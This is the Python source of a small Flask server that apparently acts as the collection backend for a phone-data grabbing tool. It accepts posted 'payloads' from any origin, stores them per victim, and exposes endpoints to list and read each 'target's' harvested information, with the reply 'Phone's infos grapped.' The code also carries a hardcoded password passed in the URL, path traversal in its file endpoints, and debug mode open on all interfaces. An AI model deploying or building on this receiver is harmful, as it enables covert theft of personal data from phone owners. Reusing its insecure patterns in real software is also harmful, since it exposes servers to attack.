# coding: utf-8
from flask import Flask, jsonify, request, render_template
from flask_cors import CORS, cross_origin
import datetime
import json
from os import listdir, path, makedirs, remove


app = Flask(__name__)
PASSWORD = "dar"

CORS(app, support_credentials=True)

app.config['Secret'] = "Secret"

# We create the payload directory if it doesn't exist
if not path.exists("./static/payloads/"):
    makedirs("./static/payloads/")


@app.route("/")
def index():
    return render_template("index.html")


@app.route('/payload', methods=['POST']) # To prevent Cors issues
@cross_origin(supports_credentials=True)
def payload():
    payload = request.json["payload"]
    with open("./static/payloads/" + str(datetime.datetime.now()).replace(" ", "-") + ".json", "a+") as fir:
        json.dump(payload, fir, indent=4)

    return jsonify({ 
        'status':'success',
        'message': 'Phone\'s infos grapped.',
        'documentation': 'To get the list of files : /get | To get a file content : /getit/<json-file-name>'
    })


# list of targets
@app.route('/get', methods=['GET']) # To prevent Cors issues
@cross_origin(supports_credentials=True)
def get():
    return jsonify({
        'status':'success', 
        'result': listdir("./static/payloads/"),
        'documentation': 'To get a file content : /getit/<json-file-name>'
    })


# details on a target
@app.route('/getit/<json_file>', methods=['GET']) # To prevent Cors issues
@cross_origin(supports_credentials=True)
def getit(json_file):

    if path.exists("./static/payloads/" + json_file):
        return jsonify({
            'status':'success', 
            'result': json.loads(open("./static/payloads/" + json_file).read())
        })
    else:
        return jsonify({
            'status':'error', 
            'message': "This file doesn't exist on the server !"
        })


# details on a target
@app.route('/delit/<password>/<json_file>', methods=['GET']) # To prevent Cors issues
@cross_origin(supports_credentials=True)
def deleteit(password, json_file):

    if password == PASSWORD:
        if path.exists("./static/payloads/" + json_file):
            remove("./static/payloads/" + json_file)
            return jsonify({
                'status': 'success',
                'message': 'file deleted successfully'
            })
        else:
            return jsonify({
                'status': 'error', 
                'message': "This file doesn't exist on the server !"
            })
    else:
        return jsonify({
            'status': 'error', 
            'message': "You don't have right permissions to delete this file!"
        })


if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True, port=4347)
